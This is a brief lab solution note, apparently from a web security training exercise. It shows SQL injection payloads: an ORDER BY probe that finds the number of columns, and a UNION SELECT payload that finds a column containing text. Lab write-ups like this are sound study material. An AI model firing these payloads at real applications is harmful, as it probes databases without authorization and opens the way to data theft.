# title : SQL injection UNION attack, finding a column containing text


## first payload 
```
' ORDER BY 3-- 
```



## Solution
1. Find number of columns using `ORDER BY`.
2. Inject test string into each column:

```sql
' UNION SELECT NULL, 'KfGLou', NULL-- -
